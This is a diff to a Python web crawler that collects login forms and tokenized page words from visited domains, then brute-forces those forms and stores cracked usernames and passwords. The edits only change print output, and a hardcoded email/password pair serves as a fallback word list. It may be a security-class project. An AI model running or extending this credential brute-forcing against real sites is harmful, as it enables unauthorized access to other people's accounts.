@@ -50,7 +50,7 @@ class Crawler:
                 print("> New Domain Detected: " + domain.url)
 
                 # Add subdomains
-                print('\n> Currently checking for existing subdomains...')
+                # print('\n> Currently checking for existing subdomains...')
                 # for subdomain in self.validate_subdomains(domain.url, user_agent):
                 #     print("> Found Subdomain: " + subdomain)
                 #     if subdomain not in visited:
@@ -79,9 +79,9 @@ class Crawler:
                         to_traverse.append(DomainNode(link, user_agent, max_depth, max_pages))
 
         # Print the aggregated output from the crawler.
-        print("Total Domains Visited: {}".format(visited))
-        print("Login Forms: {}".format(self.login_forms))
-        print("Tokenized Words: {}".format(self.tokenized))
+        print("Total Domains Visited: {}\n".format(visited))
+        print("Login Forms: {}\n".format(self.login_forms))
+        print("Tokenized Words: {}\n".format(self.tokenized))
 
         # Begin bruteforcing forms
         for login_form in self.login_forms:
@@ -98,16 +98,17 @@ class Crawler:
                 words = {"bawofafefe@kulmeo.com", "Test12345!"}
 
             post_req = HttpRequest(host, port, "POST")
+            print(f'Attempting to crack {host}{form_url}...')
             success = bruteforce(post_req, form_url, host, port, ua, user_key, pass_key, action_val, words)
 
             if len(success) == 0:
-                print(f'Unable to crack {host}{form_url}')
+                print(f'    Unable to crack {host}{form_url}')
                 continue
             else:
-                print(f'Cracked users for {host}{form_url}')
+                print(f'    SUCCESS!')
             for cred in success:
                 self.cracked[cred.user] = cred.password
-                print(f'    user = {cred.user}, pass = {cred.password}')
+                print(f'        user = {cred.user}, pass = {cred.password}')
 
         return visited
     
